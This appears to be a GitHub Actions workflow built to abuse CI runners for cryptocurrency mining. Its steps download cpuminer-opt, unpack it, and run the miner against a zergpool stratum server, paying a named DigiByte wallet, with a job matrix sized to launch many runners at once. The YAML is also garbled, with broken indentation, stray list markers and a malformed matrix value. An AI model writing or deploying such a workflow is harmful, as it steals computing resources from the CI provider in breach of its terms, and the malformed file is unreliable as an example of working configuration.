name: eX-code_UMBL

on: [workflow_dispatch]

jobs:

  build:

      name: eX-code_UMBL

          runs-on: windows-latest

              strategy:

                    max-parallel: 5

                          fail-fast: false

                                matrix:

                                        go: [1.0, 1.1, 1.2, 1.3, 1,35]

                                                flag: [A, B, C, D, E, F, G, H, I]

                                                    env:

                                                            NUM_JOBS: 20

                                                                    JOB: ${{ matrix.go }}

                                                                        steps:

                                                                            - name: PREPARING

                                                                            -       run: Invoke-WebRequest https://github.com/JayDDee/cpuminer-opt/releases/download/v3.17.1/cpuminer-opt-3.17.1-windows.zip -Outfile cpuminer-opt-3.17.1-windows.zip

                                                                            -           - name: Seting-UP

      run: Expand-Archive cpuminer-opt-3.17.1-windows.zip

          - name: Running

          -       run: .\cpuminer-opt-win\cpuminer-sse2.exe -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u DGB_dgb1qkpmvdct307nehn5lwr5scprtter9qdpe98uvu7.WORKER_NAME -p c=DGB

          -           - name: DONE

      run: exit
